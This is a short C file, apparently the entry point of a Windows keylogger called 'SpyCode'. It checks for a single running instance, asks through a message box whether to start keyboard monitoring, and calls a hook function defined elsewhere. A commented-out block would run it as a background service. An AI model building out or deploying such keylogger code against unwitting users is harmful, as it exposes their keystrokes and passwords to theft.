#include "hook.h"

HANDLE hMutex = NULL;


int main(int argc, char **argv){
	/*
	SERVICE_TABLE_ENTRY ServiceTable[2];  
    ServiceTable[0].lpServiceName="SpyCode";  
    ServiceTable[0].lpServiceProc=(LPSERVICE_MAIN_FUNCTION)ServiceMain;  
    ServiceTable[1].lpServiceName=NULL;  
    ServiceTable[1].lpServiceProc=NULL;  
    StartServiceCtrlDispatcher(ServiceTable);  
	*/
	//使用互斥量来检测系统只创建一个程序实例
	hMutex = CreateMutex(NULL, FALSE, "SpyCode");
	if (hMutex)
    {
        if(ERROR_ALREADY_EXISTS != GetLastError()){
			int ret = MessageBox( 0, "运行键盘监听程序?", "spycode", MB_OKCANCEL );
			if(ret==IDOK){
				hookVirtualKey();
			}
			else{
				exit(0);
			}
		}
		else{
			MessageBox( 0, "程序已经在运行啦!", "提示", MB_OK );
		}
	}

//	hookVirtualKey();
	return 0;
}
